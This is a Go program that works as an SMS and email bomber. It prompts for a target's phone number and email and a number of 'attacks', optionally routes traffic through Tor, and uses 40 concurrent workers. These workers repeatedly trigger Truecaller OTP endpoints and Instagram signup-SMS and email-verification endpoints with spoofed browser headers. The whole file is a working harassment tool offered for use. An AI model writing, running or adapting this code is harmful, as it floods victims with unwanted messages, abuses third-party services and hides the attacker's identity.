package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
}

func setCommonHeaders(req *http.Request, originUrl string) {
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Origin", originUrl)
	req.Header.Set("Referer", originUrl+"/")
	req.Header.Set("X-CSRFToken", "missing") // A common token, might need a real value
	req.Header.Set("X-Instagram-AJAX", "1")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
}

func sendJSONRequest(client *http.Client, ctx context.Context, urlString string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	if urlString == "" { ch <- -1; return }

	jsonData, _ := json.Marshal(payload)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, urlString, bytes.NewBuffer(jsonData))
	if err != nil { ch <- -1; return }

	parsedURL, _ := url.Parse(urlString)
	setCommonHeaders(req, parsedURL.Scheme+"://"+parsedURL.Host)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil { ch <- http.StatusInternalServerError; return }
	ch <- resp.StatusCode
	resp.Body.Close()
}

func sendFormRequest(client *http.Client, ctx context.Context, urlString string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()
	if urlString == "" { ch <- -1; return }

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, urlString, strings.NewReader(formData.Encode()))
	if err != nil { ch <- -1; return }

	parsedURL, _ := url.Parse(urlString)
	setCommonHeaders(req, parsedURL.Scheme+"://"+parsedURL.Host)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil { ch <- http.StatusInternalServerError; return }
	ch <- resp.StatusCode
	resp.Body.Close()
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func parsePhoneNumber(fullNumber string) (string, string) {
	if !strings.HasPrefix(fullNumber, "+") { return "", "" }
	numericToAlpha := map[string]string{ "32": "be", "98": "ir", "1": "us", "44": "gb" }
	for numCode, alphaCode := range numericToAlpha {
		if strings.HasPrefix(fullNumber, "+"+numCode) {
			return strings.TrimPrefix(fullNumber, "+"), alphaCode
		}
	}
	return "", ""
}

func main() {
	rand.Seed(time.Now().UnixNano())
	clearScreen()
	fmt.Println("... Your ASCII Art Banner ...")

	var phone, email string
	fmt.Print("\033[01;32mEnter target phone: \033[00;36m")
	fmt.Scan(&phone)
	fmt.Print("\033[01;32mEnter target email: \033[00;36m")
	fmt.Scan(&email)
	var repeatCount int
	fmt.Print("\033[01;32mEnter number of attacks: \033[00;36m")
	fmt.Scan(&repeatCount)
	var useTor string
	fmt.Print("\033[01;33mUse Tor? (yes/no): \033[00;36m")
	fmt.Scan(&useTor)

	client := &http.Client{Timeout: 30 * time.Second}
	if strings.ToLower(useTor) == "yes" {
		fmt.Println("\033[01;32m[*] Configuring to use Tor proxy...")
		dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
		if err != nil { fmt.Println("Error creating Tor dialer:", err); os.Exit(1) }
		client.Transport = &http.Transport{ DialContext: dialer.(proxy.ContextDialer).DialContext }
	}

	numWorkers := 40
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		c := make(chan os.Signal, 1)
		signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
		<-c
		cancel()
	}()

	tasks := make(chan func(), repeatCount*10)
	ch := make(chan int, repeatCount*10)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		go func() { for task := range tasks { task() } }()
	}

	for i := 0; i < repeatCount; i++ {
		// --- SMS Tasks ---
		if phone != "" {
			// Truecaller APIs
			wg.Add(1)
			tasks <- func() {
				phoneNum, countryCode := parsePhoneNumber(phone)
				if phoneNum != "" {
					sendJSONRequest(client, ctx, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp", map[string]interface{}{"phone": phoneNum, "countryCode": countryCode}, &wg, ch)
				} else { wg.Done() }
			}
			wg.Add(1)
			tasks <- func() {
				phoneNum, countryCode := parsePhoneNumber(phone)
				if phoneNum != "" {
					sendJSONRequest(client, ctx, "https://asia-south1-truecaller-web.cloudfunctions.net/webapi/noneu/auth/truecaller/v1/send-otp", map[string]interface{}{"phone": phoneNum, "countryCode": countryCode}, &wg, ch)
				} else { wg.Done() }
			}
			
			// ** Instagram SMS - با توکن‌های واقعی شما **
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("client_id", "o6b3g31liy0349b20kb19pag1a5hdc9rqrs1d9otikboy4akfh")
				formData.Set("phone_number", phone)
				formData.Set("jazoest", "21771")
				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/send_signup_sms_code_ajax/", formData, &wg, ch)
			}
		}

		// --- Email Tasks ---
		if email != "" {
			// ** Instagram Email - با توکن‌های واقعی شما **
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("device_id", "o6b3g31liy0349b20kb19pag1a5hdc9rqrs1d9otikboy4akfh")
				formData.Set("email", email)
				formData.Set("jazoest", "21771")
				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/accounts/send_verify_email/", formData, &wg, ch)
			}
		}
	}

	close(tasks)
	go func() { wg.Wait(); close(ch) }()

	fmt.Println("\n[*] Starting attack... Press Ctrl+C to stop.")
	successCount, failCount := 0, 0
	for statusCode := range ch {
		if statusCode >= 200 && statusCode < 300 {
			fmt.Println("\033[01;32m[+] Request Succeeded")
			successCount++
		} else if statusCode > 0 {
			fmt.Printf("\033[01;31m[-] Request Failed with status: %d\n", statusCode)
			failCount++
		}
	}
	// اصلاح شده: کد ANSI و آکولاد بسته پایانی
	fmt.Printf("\n\033[01;34m[*] Attack finished. Success: %d, Failed/Canceled: %d\n\033[0m", successCount, failCount)
}
